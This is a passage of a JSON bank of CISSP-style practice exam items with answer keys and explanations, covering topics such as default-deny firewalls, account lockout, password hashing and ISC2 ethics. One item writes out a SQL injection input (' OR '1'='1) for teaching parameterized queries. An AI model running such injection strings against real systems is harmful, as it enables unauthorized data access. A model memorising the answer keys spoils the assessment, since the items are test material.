      "stem": "An application development team argues that their new internal tool only needs to be secured with a username and password because it is 'only accessible from inside the corporate network.' A security architect disagrees. Which argument BEST supports the architect's position?",
      "choices": [
        "All applications must use MFA — this is required by the organization's compliance framework",
        "The internal network is always more trusted than external networks, so authentication requirements can be relaxed for internal applications",
        "Internal network access doesn't prevent insider threats, compromised workstations, or lateral movement by attackers already inside the perimeter — defense-in-depth requires controls at the application layer regardless of network location",
        "Internal tools should use certificate-based authentication instead of passwords, which is the organization's standard"
      ],
      "correctIndex": 2,
      "difficulty": -0.7,
      "discrimination": 1.0,
      "explanation": "Correct Answer: Internal network placement doesn't eliminate insider threats or lateral movement by compromised systems — defense-in-depth requires per-application controls. The 'internal only' assumption is a classic perimeter-security fallacy. Insider threats, compromised endpoints, and attackers who have already broken in all operate from inside the network. Relying solely on network location as a security boundary provides no application-layer defense. Compliance requirements may reinforce the architect's point but are not the strongest architectural argument. Certificate-based vs. password authentication is a separate question about authentication strength, not the core issue."
    },
    {
      "id": "d3-q36",
      "domain": "3 Security Architecture and Engineering",
      "stem": "A security team is evaluating a vendor's encryption product for storing sensitive HR data. The vendor claims their proprietary encryption algorithm is stronger than AES because 'it has never been publicly analyzed.' The procurement team is inclined to accept this claim. What is the MOST appropriate security response?",
      "choices": [
        "Run the product against a known plaintext and compare the output to verify the encryption is functioning correctly",
        "Accept the claim — if the algorithm has never been analyzed, it cannot have any known weaknesses",
        "Request that the vendor provide a patent certificate for the algorithm as proof of its uniqueness and quality",
        "Reject the claim — cryptographic security requires public scrutiny and peer review; algorithms that have not been publicly analyzed provide no verifiable security assurance, regardless of vendor claims"
      ],
      "correctIndex": 3,
      "difficulty": -0.75,
      "discrimination": 1.0,
      "explanation": "Correct Answer: Reject the claim — security through obscurity is not a valid cryptographic standard. Strong cryptographic algorithms (AES, RSA, ECC) derive their strength from mathematical hardness that has been validated through years of public analysis by the global cryptographic community. An unanalyzed proprietary algorithm may contain fundamental flaws that only become apparent through expert review. 'Never been analyzed' means no one has confirmed it's secure — the opposite of assurance. Patents protect intellectual property, not cryptographic soundness. Running a known-plaintext test only verifies the product encrypts something — not the strength of the algorithm."
    },
    {
      "id": "d3-q37",
      "domain": "3 Security Architecture and Engineering",
      "stem": "A critical production server has not been patched for 18 months because the application owner says it is too risky to patch without testing. A vulnerability scanner flags three high-severity CVEs on the server. The security team needs to reduce risk immediately while the application owner schedules a patching window. Which compensating control MOST directly reduces the exposure from the unpatched vulnerabilities?",
      "choices": [
        "Disable the vulnerability scanner alerts for this server to avoid generating false urgency",
        "Accept the risk formally in the risk register and wait for the application owner to schedule patching",
        "Require the application owner to sign a personal liability waiver acknowledging the unpatched state",
        "Implement host-based and network-layer access restrictions that limit which systems can communicate with the vulnerable server, reducing the attack surface while patching is scheduled"
      ],
      "correctIndex": 3,
      "difficulty": -0.65,
      "discrimination": 1.0,
      "explanation": "Correct Answer: Network and host-based access restrictions as compensating controls. When patching is temporarily unavailable, limiting which systems can reach the vulnerable server reduces the exploitable attack surface. An attacker cannot exploit a vulnerability they cannot reach. Disabling scanner alerts hides the risk rather than managing it. Formal risk acceptance without any compensating controls is insufficient when compensating controls are feasible. Liability waivers are administrative, not technical controls — they don't reduce the likelihood of exploitation."
    },
    {
      "id": "d4-q33",
      "domain": "4 Communication and Network Security",
      "stem": "A network engineer is configuring a new firewall to protect a critical database server. The engineer asks whether to use a default-allow or default-deny rule set as the base policy. Which approach is MOST aligned with security best practices, and why?",
      "choices": [
        "Default-allow during business hours and default-deny after hours to balance availability and security",
        "Default-allow — permit all traffic unless explicitly blocked; this minimizes operational disruption while security rules are tuned",
        "The choice depends on the server's criticality — only highly classified systems require default-deny policies",
        "Default-deny — block all traffic unless explicitly permitted; this ensures only authorized traffic reaches the server and any new traffic type requires a deliberate policy decision"
      ],
      "correctIndex": 3,
      "difficulty": -0.8,
      "discrimination": 0.95,
      "explanation": "Correct Answer: Default-deny (implicit deny all). Default-deny ensures that anything not explicitly permitted is blocked — the safest baseline for protecting critical systems. This forces intentional, auditable policy decisions for every permitted traffic flow. Default-allow creates a 'deny list' approach where any traffic type not yet blocked is permitted — attackers can use protocols that haven't been explicitly denied. Time-based rules are a management overhead with no security basis — attackers don't observe business hours. Default-deny is a universal best practice for firewall policy, not limited to classified systems."
    },
    {
      "id": "d4-q34",
      "domain": "4 Communication and Network Security",
      "stem": "A web developer deploys a new internal dashboard that handles employee login credentials and payroll information over plain HTTP. A security review flags this immediately. What is the PRIMARY risk this creates and what is the MOST direct remediation?",
      "choices": [
        "HTTP does not support cookie-based session management, which means sessions can be hijacked — remediate by switching to token-based authentication",
        "HTTP pages can be cached by proxy servers, allowing sensitive data to persist in browser caches — remediate by configuring cache-control headers",
        "Credentials and payroll data are transmitted in cleartext and can be intercepted by anyone on the network path — remediate by enabling TLS and redirecting all HTTP traffic to HTTPS",
        "HTTP allows cross-site request forgery attacks — remediate by adding CSRF tokens to all forms"
      ],
      "correctIndex": 2,
      "difficulty": -0.85,
      "discrimination": 0.95,
      "explanation": "Correct Answer: Cleartext transmission — remediated by TLS/HTTPS. HTTP transmits all data in plaintext. Anyone on the network path (internal eavesdropper, malicious network device) can read credentials and payroll data as it travels. This is the most critical risk and TLS is the direct remediation. Cache-control issues are secondary concerns. HTTP does support cookies — the session management claim is incorrect. CSRF is a real concern but secondary to the fundamental cleartext exposure."
    },
    {
      "id": "d4-q35",
      "domain": "4 Communication and Network Security",
      "stem": "A company's field engineers work from various client sites and coffee shops. They need to access internal engineering systems that are not publicly accessible. The IT team is selecting a secure remote access solution. Which approach BEST ensures confidentiality of data in transit and authentication of remote users?",
      "choices": [
        "Issue static IP addresses to field engineers so the firewall can whitelist their addresses",
        "A VPN with strong authentication (certificate + MFA) that encrypts traffic between the field device and the corporate network before accessing internal systems",
        "Use HTTPS for the engineering system's web interface, which provides sufficient encryption for remote access",
        "Configure the internal engineering systems to accept connections from any IP address to simplify remote access"
      ],
      "correctIndex": 1,
      "difficulty": -0.75,
      "discrimination": 1.0,
      "explanation": "Correct Answer: VPN with certificate and MFA. A VPN creates an encrypted tunnel from the field device to the corporate network, protecting all traffic in transit regardless of the engineer's network environment. Combined with certificate-based authentication and MFA, it ensures both confidentiality and strong identity verification. Opening internal systems to any IP removes access control entirely. HTTPS on the web interface alone doesn't protect other internal services and doesn't prevent network eavesdropping of non-HTTPS traffic. Static IP whitelisting is easily spoofed and provides no encryption."
    },
    {
      "id": "d4-q36",
      "domain": "4 Communication and Network Security",
      "stem": "A network scan reveals that port 23 (Telnet) is open and accepting connections on a production server. The server is managed by an operations team that uses Telnet for convenience because it was already configured. The security team flags this as high risk. What is the MOST appropriate remediation?",
      "choices": [
        "Disable Telnet and replace it with SSH — SSH provides encrypted, authenticated remote shell access without transmitting credentials in cleartext",
        "Require the operations team to use complex passwords for Telnet access to reduce unauthorized login risk",
        "Enable network-level authentication before the Telnet session starts to add a layer of access control",
        "Place the server behind a firewall rule that only allows Telnet connections from the operations team's IP range"
      ],
      "correctIndex": 0,
      "difficulty": -0.8,
      "discrimination": 0.95,
      "explanation": "Correct Answer: Disable Telnet and replace with SSH. Telnet transmits all data including credentials in cleartext over the network — anyone who can capture network traffic can read usernames, passwords, and all session content. SSH is the direct, widely supported replacement that provides equivalent functionality with encryption and host authentication. Restricting Telnet by IP range reduces exposure but still allows cleartext credential interception from allowed hosts. Complex passwords don't address the cleartext transmission issue. Network-level authentication adds a layer but Telnet sessions remain unencrypted after authentication."
    },
    {
      "id": "d5-q33",
      "domain": "5 Identity and Access Management",
      "stem": "A security policy requires that user accounts be locked after five consecutive failed login attempts. A system administrator reports that a critical application server does not enforce this setting — accounts never lock out regardless of failed attempts. What attack does this missing control MOST directly enable?",
      "choices": [
        "Pass-the-hash attacks — without lockout, stolen password hashes can be replayed indefinitely",
        "Brute-force and password spraying attacks — without lockout, an attacker can make unlimited login attempts to guess credentials without triggering any account protection",
        "Session hijacking — without lockout, expired sessions remain valid and can be reused by attackers",
        "SQL injection — without lockout, the login form is vulnerable to database manipulation"
      ],
      "correctIndex": 1,
      "difficulty": -0.8,
      "discrimination": 0.95,
      "explanation": "Correct Answer: Brute-force and password spraying attacks. Account lockout is specifically designed to prevent automated password guessing by limiting the number of attempts before the account is locked. Without it, an attacker can try thousands of passwords per second without interruption. Pass-the-hash attacks use captured hashes, not repeated login attempts — lockout doesn't affect them. SQL injection is an input validation issue unrelated to account lockout. Session hijacking involves captured tokens, not repeated login attempts."
    },
    {
      "id": "d5-q34",
      "domain": "5 Identity and Access Management",
      "stem": "An IT helpdesk receives a call from someone claiming to be the CFO. The caller says they are traveling, forgot their password, and needs it reset immediately without going through the normal identity verification process. The caller becomes impatient when the technician asks verification questions. What should the helpdesk technician do?",
      "choices": [
        "Follow the standard identity verification procedure regardless of the caller's claimed seniority or urgency — then process the reset only after identity is confirmed through an out-of-band method",
        "Escalate to the supervisor who can make the judgment call about whether to bypass verification for a senior executive",
        "Reset the password immediately to avoid escalating the situation with a senior executive who may be a legitimate user",
        "Ask the caller their employee ID and department as verification, then proceed with the reset"
      ],
      "correctIndex": 0,
      "difficulty": -0.7,
      "discrimination": 1.0,
      "explanation": "Correct Answer: Follow the standard identity verification procedure — no exceptions for claimed seniority or urgency. Social engineering attacks commonly exploit urgency and authority claims. The helpdesk must verify identity through an out-of-band method (callback to a known number, supervisor confirmation through a separate channel) before resetting any credentials. Bypassing verification for 'senior executives' is exactly what attackers rely on. Employee ID and department are easily obtained through social research — they don't constitute strong identity verification. Escalating to a supervisor to decide on an exception creates the same social engineering opportunity at a higher level."
    },
    {
      "id": "d5-q35",
      "domain": "5 Identity and Access Management",
      "stem": "An audit finds that five members of the IT team share a single 'admin' account to access a critical server. When a configuration error occurred, no one could determine who made the change. A manager argues shared accounts are acceptable since all five people are trusted. What is the PRIMARY security risk of this arrangement?",
      "choices": [
        "Shared accounts reduce security because all five users use the same password, which is weaker than individual complex passwords",
        "Shared accounts eliminate individual accountability — audit logs record actions under the shared account name, making it impossible to attribute specific changes to any individual, which defeats the purpose of access logging",
        "Shared accounts violate the principle of least privilege because all five users receive the same admin-level access they may not all need",
        "Shared accounts make credential rotation operationally difficult since all five users must be informed whenever the password changes"
      ],
      "correctIndex": 1,
      "difficulty": -0.75,
      "discrimination": 1.0,
      "explanation": "Correct Answer: Elimination of individual accountability. The PRIMARY security risk of shared accounts is the inability to attribute actions to individuals — the scenario demonstrated this exactly. Without individual accountability, investigations are impossible, insider threat detection fails, and audit requirements cannot be met. Password strength is a secondary concern — even a strong shared password creates the accountability gap. Least privilege is a separate issue — each of the five may genuinely need admin access. Operational difficulty with credential rotation is an inconvenience, not the primary security concern."
    },
    {
      "id": "d5-q36",
      "domain": "5 Identity and Access Management",
      "stem": "An employee transfers from the Finance department to the Operations department. Two months later, an access review finds the employee still has full access to all Finance systems in addition to newly provisioned Operations access. What process failure does this represent, and what control would MOST directly prevent it?",
      "choices": [
        "A joiner-mover-leaver process failure — the mover workflow did not revoke Finance access when Operations access was provisioned; automated role-change provisioning tied to HR system events would prevent it",
        "A need-to-know failure — the employee's new role doesn't require knowing Finance data, so the access should be blocked at the data classification level",
        "A separation of duties failure — Finance and Operations access should never coexist in any account under any circumstances",
        "A least privilege failure — the employee should never have had full Finance access in the first place"
      ],
      "correctIndex": 0,
      "difficulty": -0.7,
      "discrimination": 1.0,
      "explanation": "Correct Answer: Joiner-mover-leaver (JML) process failure. The mover workflow — triggered when an employee changes roles — must revoke access to the previous role and provision access for the new role. Without automated deprovisioning tied to HR system role changes, old access persists indefinitely. While least privilege may have been appropriate when the employee was in Finance, the failure is in the transition, not the original grant. Need-to-know is related but the root cause is the missing automated revocation. Separation of duties applies to incompatible functions (like creating and approving payments), not merely different departments."
    },
    {
      "id": "d5-q37",
      "domain": "5 Identity and Access Management",
      "stem": "A cloud platform requires users to authenticate with a username and password. The security team wants to add a second factor. Management asks which second factor provides the MOST significant security improvement over a password alone for most enterprise users, considering both security and usability.",
      "choices": [
        "A CAPTCHA challenge to confirm the user is human before proceeding with authentication",
        "A security question such as mother's maiden name or first pet's name as the second factor",
        "A second, more complex password prompt that must be different from the first",
        "A time-based one-time password (TOTP) authenticator app — it requires something the user physically possesses (the enrolled device) and generates codes that expire every 30 seconds, blocking credential-only attacks"
      ],
      "correctIndex": 3,
      "difficulty": -0.65,
      "discrimination": 1.0,
      "explanation": "Correct Answer: TOTP authenticator app. A TOTP app adds a genuine second factor — something the user has (the enrolled device) — distinct from something they know (password). This blocks attacks where passwords are stolen (phishing, breaches) because the attacker still needs the physical device. A second password is still 'something you know' — it's two factors of the same type and doesn't materially improve security against credential theft. Security questions are also knowledge-based, often publicly inferable, and are widely recognized as weak second factors. CAPTCHAs verify humanness, not identity — they are not an authentication factor."
    },
    {
      "id": "d6-q31",
      "domain": "6 Security Assessment and Testing",
      "stem": "A vulnerability scan of a web application server returns a critical finding: the server is running a version of OpenSSL with a known remote code execution vulnerability. A patch is available from the vendor. The application owner asks what should happen NEXT.",
      "choices": [
        "Test the patch in a staging environment, obtain change control approval, and deploy to production within the organization's critical-patch SLA window — do not wait for the next scheduled maintenance cycle",
        "Schedule the patch for the next quarterly maintenance window to avoid unplanned downtime",
        "Dismiss the finding if the server is behind a firewall, since network controls reduce the risk sufficiently",
        "Mark the finding as accepted and document it in the risk register without patching, since the server has not been exploited yet"
      ],
      "correctIndex": 0,
      "difficulty": -0.8,
      "discrimination": 0.95,
      "explanation": "Correct Answer: Test, approve, and deploy within the critical-patch SLA — do not defer to the quarterly cycle. Critical CVEs with available patches require expedited treatment. Waiting for a quarterly cycle on a remote code execution vulnerability leaves a known, patchable risk exposed far longer than necessary. Firewall presence reduces but doesn't eliminate risk — the vulnerability can be reached if any firewall exception exists, or if the firewall is misconfigured. Risk acceptance without patching when a patch is available is difficult to justify and would not satisfy most compliance frameworks."
    },
    {
      "id": "d6-q32",
      "domain": "6 Security Assessment and Testing",
      "stem": "Before a penetration test begins, the client and testing firm sign a rules of engagement document that defines the IP ranges in scope, the testing window, permitted techniques, and escalation contacts. A junior tester asks why this document is necessary if the client has already verbally authorized the test. What is the PRIMARY purpose of the rules of engagement document?",
      "choices": [
        "It is a formality required for billing purposes and has no legal significance beyond the verbal authorization already given",
        "It protects the testing firm from liability if the client's systems are unavailable after the test, regardless of whether the tester caused the downtime",
        "It provides written authorization that legally distinguishes the test from unauthorized computer access, defines exact scope to prevent unintended damage, and establishes escalation procedures for unexpected findings",
        "It is only required for tests that include social engineering components, not for technical network testing"
      ],
      "correctIndex": 2,
      "difficulty": -0.75,
      "discrimination": 1.0,
      "explanation": "Correct Answer: Written authorization, scope definition, and legal protection. Without written authorization, penetration testing activity can constitute unauthorized computer access under computer fraud laws. The rules of engagement define the exact scope (IP ranges, systems, techniques) — preventing accidental testing of systems outside the agreement and providing clear legal authorization. Verbal authorization provides no legal protection for the tester. The document's purpose is scope and authorization, not billing. Written rules of engagement are required for all types of penetration testing, not only social engineering."
    },
    {
      "id": "d6-q33",
      "domain": "6 Security Assessment and Testing",
      "stem": "An organization completes a risk assessment and identifies ten security control gaps. Budget allows remediation of only four gaps this quarter. The security team must decide which four to address first. Which prioritization approach is MOST aligned with risk management principles?",
      "choices": [
        "Prioritize equally across all ten gaps by allocating one-tenth of the budget to each, ensuring all risks receive some attention",
        "Prioritize the gaps that were identified in previous assessments first, since older findings represent longer periods of exposure",
        "Prioritize the gaps with the highest combination of likelihood and potential business impact — address the risks that could cause the greatest harm with the highest probability first",
        "Prioritize the gaps that are fastest to remediate to maximize the number of controls improved within the quarter"
      ],
      "correctIndex": 2,
      "difficulty": -0.7,
      "discrimination": 1.0,
      "explanation": "Correct Answer: Highest likelihood × impact combination first. Risk-based prioritization directs limited resources to the threats that pose the greatest overall risk — the product of likelihood and potential harm. Speed of remediation (lowest-effort first) optimizes for activity metrics, not risk reduction. Age of a finding is relevant context but doesn't override the risk calculus — a new critical finding outranks an old low-risk finding. Distributing budget equally across all gaps treats a critical risk the same as a negligible one, which is the opposite of risk-based decision making."
    },
    {
      "id": "d6-q34",
      "domain": "6 Security Assessment and Testing",
      "stem": "A penetration test report rates a finding as Critical severity. The finding shows that the organization's primary customer database is accessible to unauthenticated users from the internet. The development manager argues the finding is overstated because 'the data is encrypted at rest.' The security team disagrees. Who is correct, and why?",
      "choices": [
        "The security team is correct — encryption at rest protects data on disk from physical theft but does not protect against an authenticated query that returns decrypted data to an unauthenticated remote user; the severity is accurately rated Critical",
        "The development manager is correct — if data is encrypted at rest, it cannot be read by unauthorized users even if the database is accessible",
        "Both are partially correct — the severity should be downgraded to High since encryption at rest provides meaningful mitigation",
        "The severity depends on what data is in the database — without classifying each field, the critical rating cannot be confirmed"
      ],
      "correctIndex": 0,
      "difficulty": -0.65,
      "discrimination": 1.0,
      "explanation": "Correct Answer: The security team is correct. Encryption at rest protects data files when accessed directly on disk (e.g., stolen backup tapes, direct storage access). When a database responds to SQL queries through its normal interface, the database engine decrypts the data automatically before returning it. An unauthenticated user querying the database via the internet receives plaintext data — encryption at rest provides zero protection in this attack scenario. The Critical rating is accurate. The severity of missing authentication on an internet-accessible database is not reduced by encryption at rest."
    },
    {
      "id": "d7-q33",
      "domain": "7 Security Operations",
      "stem": "An employee receives an email claiming to be from the IT helpdesk asking them to click a link and enter their credentials to 'verify their account.' The email was not expected and the link does not go to the corporate intranet. The employee is unsure if it is legitimate. What should the employee do FIRST?",
      "choices": [
        "Forward the email to colleagues to see if they received the same message",
        "Reply to the email asking the sender to confirm their identity before clicking anything",
        "Click the link but do not enter credentials to investigate whether the site looks legitimate",
        "Report the email to the security team without clicking any links, using the organization's official phishing reporting mechanism"
      ],
      "correctIndex": 3,
      "difficulty": -0.9,
      "discrimination": 0.95,
      "explanation": "Correct Answer: Report without clicking — use the official phishing reporting channel. The indicators (unsolicited credential request, non-corporate link) strongly suggest phishing. Reporting immediately allows the security team to investigate, block the domain, and alert other potential recipients. Replying to the email notifies the attacker that the address is active and monitored. Clicking the link — even without entering credentials — can trigger drive-by download exploits or tracking pixels. Forwarding to colleagues spreads the phishing link without adding any investigative value."
    },
    {
      "id": "d7-q34",
      "domain": "7 Security Operations",
      "stem": "A backup administrator reports that daily backups of a critical database have been running successfully for six months with no errors. An auditor asks when the backups were last tested by actually restoring data from them. The administrator admits no restore test has ever been performed. What does this gap represent, and why does it matter?",
      "choices": [
        "Untested backups provide no recovery assurance — a backup that has never been restored could be corrupted, incomplete, or unrestorable, leaving the organization without a working recovery option when it is actually needed",
        "The gap is minimal — if backup jobs complete without errors, the data is confirmed restorable",
        "Restore testing is only required for disaster recovery scenarios involving full system loss, not for routine database backups",
        "The gap is a documentation issue — the administrator should log that backups are assumed valid to satisfy the auditor"
      ],
      "correctIndex": 0,
      "difficulty": -0.8,
      "discrimination": 0.95,
      "explanation": "Correct Answer: Untested backups provide no recovery assurance. A backup job completing without errors confirms data was copied — it does not confirm the backup is readable, complete, or can be restored to a working state. Backup media can be silently corrupted. File system corruption may not trigger backup job errors. The only way to confirm a backup is valid is to restore it. Organizations regularly discover their backups are unusable only during an actual incident. Regular restore testing is required for all business-critical backups, not only full disaster recovery scenarios. Documentation without actual restore testing adds zero recovery assurance."
    },
    {
      "id": "d7-q35",
      "domain": "7 Security Operations",
      "stem": "A change control request to modify a firewall rule on a critical production system is submitted without a documented rollback plan. The change advisory board (CAB) is reviewing the request. What is the MOST appropriate CAB decision?",
      "choices": [
        "Approve the change and require the rollback plan to be documented within 24 hours after implementation",
        "Approve the change since firewall rule modifications are low-risk and rollback plans are only needed for application changes",
        "Return the request for revision — all changes to critical systems must include a tested rollback procedure before CAB approval, to ensure the environment can be restored if the change causes unexpected problems",
        "Escalate to the CISO to determine whether a rollback plan is required for this specific change"
      ],
      "correctIndex": 2,
      "difficulty": -0.7,
      "discrimination": 1.0,
      "explanation": "Correct Answer: Return for revision — require a rollback plan before approval. A rollback plan is a fundamental requirement for any change to a production system. Without it, if the change causes an outage or security issue, the team has no documented, tested path to restore the previous state. Firewall changes can have significant availability and security impact — they are not low-risk. Requiring the rollback plan after implementation defeats the purpose — the plan must be ready before the change window. This is a standard CAB decision — no CISO escalation is needed for a missing rollback plan."
    },
    {
      "id": "d7-q36",
      "domain": "7 Security Operations",
      "stem": "During routine log review, a SOC analyst notices that a server that hosts no web applications is generating outbound HTTP traffic to external IP addresses every 60 seconds. The traffic volume is small and no security alerts have fired. What is the MOST appropriate FIRST action?",
      "choices": [
        "Block all outbound HTTP traffic from that server at the firewall to stop the activity before investigating",
        "Investigate the source process generating the traffic on the server — regular interval outbound connections from a non-web server are a behavioral indicator of potential C2 beaconing",
        "Ignore the traffic since the volume is small and no alerts have fired, indicating it is likely benign background activity",
        "Escalate immediately to law enforcement since regular external connections indicate a confirmed data breach"
      ],
      "correctIndex": 1,
      "difficulty": -0.65,
      "discrimination": 1.0,
      "explanation": "Correct Answer: Investigate the source process first. Regular interval outbound connections (beaconing) from a server with no legitimate reason to make HTTP calls is a classic C2 indicator of compromise. The first step is identifying what process is generating the traffic — this may confirm or rule out compromise. Small traffic volume and lack of alerts are not reassurance — C2 beaconing is specifically designed to be low-volume to evade detection. Blocking the traffic immediately without investigation could alert an attacker and destroy forensic evidence. Law enforcement escalation is premature before confirming what the traffic actually is."
    },
    {
      "id": "d8-q27",
      "domain": "8 Software Development Security",
      "stem": "A code review finds that a login function stores user passwords in a database as plaintext. If the database is breached, all user passwords are immediately exposed. What is the MOST appropriate remediation?",
      "choices": [
        "Encrypt the passwords column using AES-256 database encryption — symmetric encryption is sufficient for protecting stored passwords",
        "Replace plaintext storage with strong adaptive password hashing (bcrypt, scrypt, or Argon2) with a unique per-user salt — these algorithms are designed specifically for password storage and are computationally expensive to brute-force",
        "Hash the passwords using MD5 with a shared application salt before storing them",
        "Base64-encode the passwords before storage to prevent direct readability of the raw text"
      ],
      "correctIndex": 1,
      "difficulty": -0.75,
      "discrimination": 1.0,
      "explanation": "Correct Answer: Adaptive password hashing (bcrypt/scrypt/Argon2) with per-user salt. Passwords require one-way hashing, not encryption — an encrypted password can be decrypted if the key is obtained. Adaptive algorithms are deliberately slow, making bulk brute-force expensive. Per-user salts prevent rainbow table attacks. AES encryption is reversible — a stolen encryption key exposes all passwords. MD5 is a fast, cryptographically broken hash function with known collision vulnerabilities and is completely unsuitable for passwords. Base64 is encoding, not encryption or hashing — it provides zero security."
    },
    {
      "id": "d8-q28",
      "domain": "8 Software Development Security",
      "stem": "A web application accepts a user-submitted search term and passes it directly to a SQL query as a string concatenation: SELECT * FROM products WHERE name = '[user_input]'. A security tester enters the value: [' OR '1'='1] and retrieves all records. What is the MOST direct remediation for this class of vulnerability?",
      "choices": [
        "Limit the length of the search input to 20 characters to prevent injection strings from being entered",
        "Log all search queries and alert the security team when they contain SQL syntax patterns",
        "Rewrite the query using parameterized statements or prepared statements — the database treats user input as a data value, never as executable SQL syntax",
        "Add a blocklist filter that rejects any input containing quotes, dashes, or SQL keywords like SELECT or OR"
      ],
      "correctIndex": 2,
      "difficulty": -0.8,
      "discrimination": 1.0,
      "explanation": "Correct Answer: Parameterized queries / prepared statements. This is the definitive fix for SQL injection — the database engine never interprets user input as SQL. Input is bound to a parameter placeholder and always treated as data. Blocklists are incomplete — attackers bypass them with encoding, alternate syntax, and case variations. There is no complete blocklist for SQL injection. Input length limits reduce some attack vectors but don't prevent all injection strings — even short inputs can be exploited. Logging and alerting is a detective control — it records exploitation but doesn't prevent it."
    },
    {
      "id": "d8-q29",
      "domain": "8 Software Development Security",
      "stem": "A new feature is ready for deployment to production. The development team completed functional testing but no security testing was performed. A security engineer asks that deployment be held until at minimum a quick security review is completed. The development manager argues it is faster to deploy now and fix any security issues that come up after release. What is the PRIMARY risk of the manager's approach?",
      "choices": [
        "The security engineer may have liability if vulnerabilities are discovered post-release without a sign-off review",
        "Security vulnerabilities discovered after production deployment are significantly more expensive to remediate and may expose real users and real data before they are fixed — defects caught before deployment cost a fraction of post-release fixes",
        "Deploying without security testing violates PCI DSS and will trigger an immediate audit finding",
        "The development team will need to redo their functional testing after security changes are applied, creating rework anyway"
      ],
      "correctIndex": 1,
      "difficulty": -0.7,
      "discrimination": 1.0,
      "explanation": "Correct Answer: Post-deployment vulnerabilities expose real users and data, and are far more costly to fix. The cost of fixing a security defect multiplies dramatically from design → development → testing → production. Post-release fixes require emergency patches, potential breach notification, user impact, and reputational damage. Pre-deployment security review catches issues when they are cheapest to fix and before real data is at risk. PCI DSS requirements depend on the scope of the system — not every deployment triggers an audit. Individual engineer liability is not the primary risk. Functional rework is a process concern, not the core security argument."
    },
    {
      "id": "d1-q47",
      "domain": "1 Security and Risk Management",
      "stem": "A security consultant is leading a vendor contract renewal evaluation on behalf of their organization. During the process, they receive an expensive gift basket from the vendor under evaluation. According to the ISC2 Code of Ethics, what should the consultant do FIRST?",
      "choices": [
        "Return the gift anonymously to preserve the professional relationship without confrontation",
        "Accept the gift since business gifts are a common professional courtesy and no law explicitly prohibits them",
        "Report the vendor to ISC2 for attempting to compromise the evaluation process",
        "Disclose the gift to their employer and recuse themselves from the vendor evaluation if the gift creates a conflict of interest"
      ],
      "correctIndex": 3,
      "difficulty": -0.4,
      "discrimination": 1.0,
      "explanation": "Correct Answer: Disclose the gift to the employer and recuse if a conflict of interest exists. Canon 2 requires acting honorably and avoiding conflicts of interest. Receiving a gift from a vendor under active evaluation creates a conflict — the consultant's objectivity may be compromised even unintentionally. Disclosure to the employer is the required first step; recusal follows if needed. Anonymous return sidesteps disclosure and doesn't address the conflict. Reporting the vendor to ISC2 is disproportionate — the ethical obligation is on the recipient to disclose. Accepting without disclosure violates the honorable conduct requirement."
    },
    {
      "id": "d1-q48",
      "domain": "1 Security and Risk Management",
      "stem": "A CISSP holder is asked by a client to lead a penetration test of an industrial control system (ICS) environment. The professional has strong IT security experience but no prior ICS or operational technology (OT) exposure. According to the ISC2 Code of Ethics, what is the MOST appropriate course of action?",
      "choices": [
        "Accept the engagement — the CISSP credential demonstrates broad security competency across all technology environments",
        "Disclose the experience gap to the client and either decline or involve a qualified ICS/OT specialist to ensure competent service is delivered",
        "Accept and document the ICS inexperience in the final report as a scope limitation",
        "Complete the general IT portions of the assessment and exclude ICS components without notifying the client"
      ],
      "correctIndex": 1,
      "difficulty": -0.5,
      "discrimination": 1.0,
      "explanation": "Correct Answer: Disclose the experience gap and either decline or involve a specialist. Canon 3 requires providing diligent and competent service to principals. Accepting specialized work without the requisite competence violates this canon — the CISSP designation does not represent mastery of every security subdomain. Transparent disclosure allows the client to make an informed decision. Accepting and disclaiming in the final report exposes the client to risk without prior informed consent. Excluding scope without disclosure is deceptive. Partnering with a qualified ICS specialist is the appropriate path if the professional wishes to support the engagement."
    },
    {
      "id": "d1-q49",
      "domain": "1 Security and Risk Management",
      "stem": "A CISSP holder discovers that a recently certified colleague misrepresented work experience hours on their ISC2 certification application. The colleague acknowledges the falsification and asks the professional to say nothing. What does the ISC2 Code of Ethics require the professional to do?",
      "choices": [
        "Keep the information confidential — it was disclosed in a personal conversation and reporting it would damage the professional relationship",
        "Confront the colleague and give them a defined period to self-disclose to ISC2 before taking further action",
        "Report the misconduct to ISC2 through the formal ethics complaint process — Canon 4 requires protecting the profession's integrity regardless of personal loyalty",
        "Report the matter to the shared employer's HR department as the appropriate authority over employee conduct"
      ],
      "correctIndex": 2,
      "difficulty": 0.4,
      "discrimination": 1.1,
      "explanation": "Correct Answer: Report the misconduct to ISC2 through the ethics complaint process. Canon 4 requires advancing and protecting the profession — certification fraud undermines the integrity of the credential and the trust it represents. ISC2 has a formal ethics complaint process specifically designed for this purpose. Personal loyalty and confidentiality expectations do not override professional obligations under the Code. HR involvement may occur separately but ISC2 is the authority over certification integrity. Waiting for the colleague to self-disclose places enforcement on the wrongdoer and allows the misconduct to persist."
    },
    {
      "id": "d1-q50",
      "domain": "1 Security and Risk Management",
      "stem": "A security engineer who designed and implemented an organization's privileged access management (PAM) system is subsequently assigned to conduct the annual security audit of that same system. A colleague raises a concern about the assignment. What is the PRIMARY ethical issue?",
      "choices": [
        "Auditing your own implementation creates a conflict of interest — objective evaluation is structurally compromised when the auditor has a personal stake in the findings, violating Canon 2's requirement for honorable and impartial conduct",
        "The engineer may lack formal audit methodology training beyond their implementation experience",
        "A dual-role assignment is only ethically problematic when the engineer also authored the governing security policy",
        "No ethical concern exists unless the engineer has a direct financial incentive tied to the audit outcome"
      ],
      "correctIndex": 0,
      "difficulty": 0.3,
      "discrimination": 1.05,
      "explanation": "Correct Answer: Auditing your own work creates a structural conflict of interest. Canon 2 requires acting honorably, honestly, and objectively. An auditor who designed and built the system under review cannot objectively assess their own work — findings of deficiency reflect directly on the auditor's prior performance, creating incentive to minimize or overlook gaps. This structural conflict invalidates audit independence regardless of intent. The concern exists without any financial incentive — compromised objectivity alone satisfies the conflict of interest. Audit skills are a separate, secondary concern."
    },
    {
      "id": "d1-q51",
      "domain": "1 Security and Risk Management",
      "stem": "A CISSP professional learns that a colleague who also holds the CISSP credential has been exfiltrating client vulnerability assessment data for personal financial gain. The professional reports this internally, but firm management decides to handle it through HR without external notification. What obligation remains under the ISC2 Code of Ethics?",
      "choices": [
        "The internal HR process satisfies the professional's ethics obligations — employer decisions govern individual reporting duties",
        "Wait to see if the HR process results in termination before considering further escalation",
        "File a formal ethics complaint with ISC2 regardless of the employer's internal handling — credential misconduct must be reported to the certifying body, and employer decisions do not discharge this duty",
        "Escalate directly to law enforcement since the firm's response is insufficient to address the harm"
      ],
      "correctIndex": 2,
      "difficulty": 0.7,
      "discrimination": 1.15,
